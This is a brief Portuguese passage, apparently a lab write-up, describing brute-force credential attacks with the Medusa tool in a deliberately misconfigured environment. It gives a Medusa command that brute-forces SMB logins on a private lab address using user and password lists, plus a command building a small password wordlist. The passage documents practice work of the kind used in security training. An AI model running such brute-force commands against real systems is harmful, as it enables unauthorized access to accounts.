nesses ataques utilizei medusa para fazer diversos ataques brute force em serviços web, e em um ambiente corporativo mal configurado siga as imagens para ver os scripts utilizados e os sucessos da invasão.
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_SMB -M smbnt -t 2 -T 50 codigo medusa 
echo -e "password\n123456\nWelcome123\nmsfadmin" > Senhas_SMB wordlist de senhas
